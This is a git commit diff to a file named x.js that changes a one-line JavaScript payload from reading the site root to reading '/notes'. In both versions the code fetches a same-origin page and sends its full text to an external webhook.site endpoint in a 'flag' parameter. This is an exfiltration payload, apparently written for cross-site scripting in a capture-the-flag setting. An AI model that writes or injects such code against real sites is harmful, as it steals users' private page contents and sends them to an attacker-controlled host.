34a7ed0a10b8ce651183cacd2f551671558682ec
aljzayryaltrath-hash <aljzayryaltrath@gmail.com>
2026-06-16 11:46:31 +0100

    Change fetch URL from '/' to '/notes'

--- x.js
+++ x.js
@@ -1,1 +1,1 @@
-fetch('/').then(r=>r.text()).then(d=>fetch('https://webhook.site/f4209e86-ce3c-4e0c-aa91-31dbd14f2ad6?flag='+encodeURIComponent(d)));
+fetch('/notes').then(r=>r.text()).then(d=>fetch('https://webhook.site/f4209e86-ce3c-4e0c-aa91-31dbd14f2ad6?flag='+encodeURIComponent(d)));
